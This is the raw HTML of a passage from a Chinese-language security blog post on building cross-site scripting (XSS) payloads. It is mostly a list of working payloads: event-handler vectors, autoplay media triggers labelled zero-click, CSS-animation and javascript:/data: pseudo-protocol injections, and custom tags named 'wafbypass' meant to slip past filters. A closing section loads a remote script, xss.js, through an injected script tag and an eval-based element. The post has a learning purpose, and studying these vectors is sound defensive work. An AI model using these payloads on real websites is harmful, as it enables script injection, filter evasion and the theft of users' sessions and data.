+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;svg onload=alert(1);&gt;&quot;</span>&gt;</span>   </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:1000px;height:1000px&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">width</span>=<span class="string">10</span> <span class="attr">loop</span>=<span class="string">2</span> <span class="attr">behavior</span>=<span class="string">&quot;alternate&quot;</span> <span class="attr">onbounce</span>=<span class="string">alert(1)</span>&gt;</span> (firefox only)</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span> <span class="comment">&lt;!-- firefox only --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span> <span class="comment">&lt;!-- firefox only --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="HTML5事件"><a href="#HTML5事件" class="headerlink" title="HTML5事件"></a>HTML5事件</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">事件名称</th>
+<th style="text-align:center">标签</th>
+<th style="text-align:center">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">onplay</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">适用于0-click：结合HTML的autoplay属性以及结合有效的视频/音频</td>
+</tr>
+<tr>
+<td style="text-align:center">onplaying</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">适用于0-click: 结合HTML的autoplay属性以及结合有效的视频/音频</td>
+</tr>
+<tr>
+<td style="text-align:center">oncanplay</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">必须链接有效的视频/音频</td>
+</tr>
+<tr>
+<td style="text-align:center">onloadeddata</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">必须链接有效的视频/音频</td>
+</tr>
+<tr>
+<td style="text-align:center">onloadedmetadata</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">必须链接有效的视频/音频</td>
+</tr>
+<tr>
+<td style="text-align:center">onprogress</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">必须链接有效的视频/音频</td>
+</tr>
+<tr>
+<td style="text-align:center">onloadstart</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">潜在的0-click向量</td>
+</tr>
+<tr>
+<td style="text-align:center">oncanplay</td>
+<td style="text-align:center">video, audio</td>
+<td style="text-align:center">必须链接有效的视频/音频</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>使用示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadeddata</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadedmetadata</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">oncanplay</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplaying</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>有关HTML的事件可以参考：<a target="_blank" rel="noopener" href="http://help.dottoro.com/lhwfcplu.php">http://help.dottoro.com/lhwfcplu.php</a></p>
+</blockquote>
+<h2 id="基于CSS事件的XSS"><a href="#基于CSS事件的XSS" class="headerlink" title="基于CSS事件的XSS"></a>基于CSS事件的XSS</h2><p>不幸的是，基于CSS来实现XSS现在已经越来越难了，我尝试过的所有向量目前都只能在非常旧的浏览器上工作。因此，下面介绍的是基于CSS来触发XSS的情况。</p>
+<p>下面的例子使用的是style标签来为动画的开始和结束设置关键帧：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="keyword">@keyframes</span> x &#123;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;animation: x;&quot;</span> <span class="attr">onanimationstart</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;animation: x;&quot;</span> <span class="attr">onanimationend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="基于伪协议的XSS"><a href="#基于伪协议的XSS" class="headerlink" title="基于伪协议的XSS"></a>基于伪协议的XSS</h2><p>伪协议不同于在因特网上广泛使用的如 <a target="_blank" rel="noopener" href="http://、https://、ftp://，在URL中使用，用于执行特定的功能。">http://、https://、ftp://，在URL中使用，用于执行特定的功能。</a></p>
+<ul>
+<li>JavaScript伪协议：一般是通过<code>href</code>属性或者<code>src</code>属性结合<code>JavaScript伪协议</code>实现跨站脚本。</li>
+<li>data伪协议：一般是通过<code>data</code>属性结合<code>data伪协议</code>实现跨站脚本。</li>
+</ul>
+<p>使用示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>javascript伪协议<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注：在safari浏览器中a标签的href属性也可以使用data伪协议。</p>
+<h2 id="自定义标签构造的XSS"><a href="#自定义标签构造的XSS" class="headerlink" title="自定义标签构造的XSS"></a>自定义标签构造的XSS</h2><h3 id="tabindex-属性"><a href="#tabindex-属性" class="headerlink" title="tabindex 属性"></a>tabindex 属性</h3><ul>
+<li><code>tabindex=正值</code>，表示元素是可聚焦的，并且可以通过键盘导航来访问到该元素。</li>
+<li><code>tabindex=&quot;0&quot;</code> ，表示元素是可聚焦的，并且可以通过键盘导航来聚焦到该元素，它的相对顺序是当前处于的DOM结构来决定的。</li>
+<li><code>tabindex=负值</code> (通常是tabindex=“-1”)，表示元素是可聚焦的，但是不能通过键盘导航来访问到该元素。</li>
+</ul>
+<p>使用示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="contenteditable属性"><a href="#contenteditable属性" class="headerlink" title="contenteditable属性"></a>contenteditable属性</h3><p>contenteditable 是一个枚举属性，表示元素是否可被用户编辑。 如果可以，浏览器会修改元素的部件以允许编辑。</p>
+<p>使用示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span> <span class="attr">contenteditable</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="user-modify属性"><a href="#user-modify属性" class="headerlink" title="user-modify属性"></a>user-modify属性</h3><p>用来控制用户能否对页面文本进行编辑。与标签的contenteditable属性类似。（该属性在chrome下使用）</p>
+<p><strong>-webkit-user-modify:</strong> read-only | read-write | read-write-plaintext-only</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">属性值</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">read-only</td>
+<td>内容只读。</td>
+</tr>
+<tr>
+<td style="text-align:left">read-write</td>
+<td>内容可读写。(支持富文本)</td>
+</tr>
+<tr>
+<td style="text-align:left">read-write-plaintext-only</td>
+<td>内容可读写，但粘贴内容中的富文本格式（如文本的颜色、大小，图片等）会丢失。内容类似于以纯文本显示。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>使用示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-user-modify:read-write&quot;</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="远程加载Payload"><a href="#远程加载Payload" class="headerlink" title="远程加载Payload"></a>远程加载Payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.123.42/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&quot;<span class="attr">appendChild</span>(<span class="attr">createElement</span>(&#x27;<span class="attr">script</span>&#x27;))<span class="attr">.src</span>=<span class="string">&#x27;http://192.168.123.42/xss.js&#x27;</span>&quot;)&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/163a9d7.html">https://plumeria.ltd/post/163a9d7.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">XSS跨站脚本</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/xss1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/8bdb3c95.html"><img class="prev-cover" src="/img/gif/loading4.gif" data-original="/img/cover/xss1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XSS的混淆与绕过</div></div></a></div><div class="next-post pull-right"><a href="/post/110c2ea3.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/xss1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XSS的原理与分类</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/110c2ea3.html" title="XSS的原理与分类"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/xss1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-05</div><div class="title">XSS的原理与分类</div></div></a></div><div><a href="/post/8bdb3c95.html" title="XSS的混淆与绕过"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/xss1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-11</div><div class="title">XSS的混淆与绕过</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">浏览器的解析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-%E8%A7%A3%E6%9E%90%E5%99%A8%E4%BA%94%E7%B1%BB%E5%85%83%E7%B4%A0"><span class="toc-number">2.</span> <span class="toc-text">HTML 解析器五类元素</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%85%83%E7%B4%A0"><span class="toc-number">2.1.</span> <span class="toc-text">空元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B%E6%96%87%E6%9C%AC%E5%85%83%E7%B4%A0"><span class="toc-number">2.2.</span> <span class="toc-text">原始文本元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCDATA"><span class="toc-number">2.3.</span> <span class="toc-text">RCDATA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%85%83%E7%B4%A0"><span class="toc-number">2.4.</span> <span class="toc-text">外部元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%85%83%E7%B4%A0"><span class="toc-number">2.5.</span> <span class="toc-text">基本元素</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Payload%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">XSS Payload结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EHTML%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">3.1.</span> <span class="toc-text">基于HTML上下文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E6%9C%BA%E5%88%B6-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">Payload机制-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E6%9C%BA%E5%88%B6-2"><span class="toc-number">3.1.2.</span> <span class="toc-text">Payload机制-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E6%9C%BA%E5%88%B6-3"><span class="toc-number">3.1.3.</span> <span class="toc-text">Payload机制-3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EJavaScript%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">3.2.</span> <span class="toc-text">基于JavaScript上下文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E6%9C%BA%E5%88%B6-1-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">Payload机制-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E6%9C%BA%E5%88%B6-2-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">Payload机制-2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EJavaScript%E4%BA%8B%E4%BB%B6%E7%9A%84XSS"><span class="toc-number">4.</span> <span class="toc-text">基于JavaScript事件的XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%87%86HTML%E4%BA%8B%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">标准HTML事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML5%E4%BA%8B%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">HTML5事件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8ECSS%E4%BA%8B%E4%BB%B6%E7%9A%84XSS"><span class="toc-number">5.</span> <span class="toc-text">基于CSS事件的XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84XSS"><span class="toc-number">6.</span> <span class="toc-text">基于伪协议的XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE%E6%9E%84%E9%80%A0%E7%9A%84XSS"><span class="toc-number">7.</span> <span class="toc-text">自定义标签构造的XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tabindex-%E5%B1%9E%E6%80%A7"><span class="toc-number">7.1.</span> <span class="toc-text">tabindex 属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#contenteditable%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.</span> <span class="toc-text">contenteditable属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-modify%E5%B1%9E%E6%80%A7"><span class="toc-number">7.3.</span> <span class="toc-text">user-modify属性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDPayload"><span class="toc-number">8.</span> <span class="toc-text">远程加载Payload</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/8bdb3c95.html" title="XSS的混淆与绕过"><img src="/img/gif/loading4.gif" data-original="/img/cover/xss1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS的混淆与绕过"/></a><div class="content"><a class="title" href="/post/8bdb3c95.html" title="XSS的混淆与绕过">XSS的混淆与绕过</a><time datetime="2021-11-11T04:00:00.000Z" title="发表于 2021-11-11 12:00:00">2021-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/163a9d7.html" title="XSS Payload的构造"><img src="/img/gif/loading4.gif" data-original="/img/cover/xss1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS Payload的构造"/></a><div class="content"><a class="title" href="/post/163a9d7.html" title="XSS Payload的构造">XSS Payload的构造</a><time datetime="2021-11-08T11:00:00.000Z" title="发表于 2021-11-08 19:00:00">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/110c2ea3.html" title="XSS的原理与分类"><img src="/img/gif/loading4.gif" data-original="/img/cover/xss1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS的原理与分类"/></a><div class="content"><a class="title" href="/post/110c2ea3.html" title="XSS的原理与分类">XSS的原理与分类</a><time datetime="2021-11-05T11:00:00.000Z" title="发表于 2021-11-05 19:00:00">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/774ae9de.html" title="sqlmap的使用技巧"><img src="/img/gif/loading4.gif" data-original="/img/cover/sqlmap.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlmap的使用技巧"/></a><div class="content"><a class="title" href="/post/774ae9de.html" title="sqlmap的使用技巧">sqlmap的使用技巧</a><time datetime="2021-11-04T02:30:00.000Z" title="发表于 2021-11-04 10:30:00">2021-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/7c4159f7.html" title="WAF-Bypass之SQL注入绕过思路总结"><img src="/img/gif/loading4.gif" data-original="/img/cover/wafbypass.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF-Bypass之SQL注入绕过思路总结"/></a><div class="content"><a class="title" href="/post/7c4159f7.html" title="WAF-Bypass之SQL注入绕过思路总结">WAF-Bypass之SQL注入绕过思路总结</a><time datetime="2021-11-01T02:30:00.000Z" title="发表于 2021-11-01 10:30:00">2021-11-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div 